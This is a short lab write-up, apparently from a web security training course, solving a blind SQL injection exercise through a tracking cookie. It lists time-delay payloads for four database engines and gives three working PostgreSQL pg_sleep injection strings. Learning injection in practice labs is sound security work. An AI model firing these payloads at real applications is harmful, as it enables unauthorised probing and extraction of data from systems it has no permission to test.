# Lab: Blind SQL injection with time delays
## Lab
This lab contains a __blind SQL injection__ vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

## Hint

You can find some useful payloads on our SQL injection cheat sheet. 

## Solution

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received. 

From cheat sheet we fuzz payload:
|SQL Server |Payload                                                                                                                                        |
|-----------|-----------------------------------------------------------------------------------------------------------------------------------------------|
|Oracle     |<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'&#124;&#124;dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual            </code>|
|Microsoft  |<code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'                                                                                   </code>|
|PostgreSQL |<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END                                                     </code>|
|MySQL      |<code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')                                                                                      </code>|


We have payloads:
`TrackingId=uQfJFCMVLEIT4i5j'||pg_sleep(10)--`
or
`TrackingId=uQfJFCMVLEIT4i5j'%3bSELECT+pg_sleep(10)--`
or
`TrackingId=uQfJFCMVLEIT4i5j'||(SELECT+pg_sleep(10))--`

So that we solved this lab

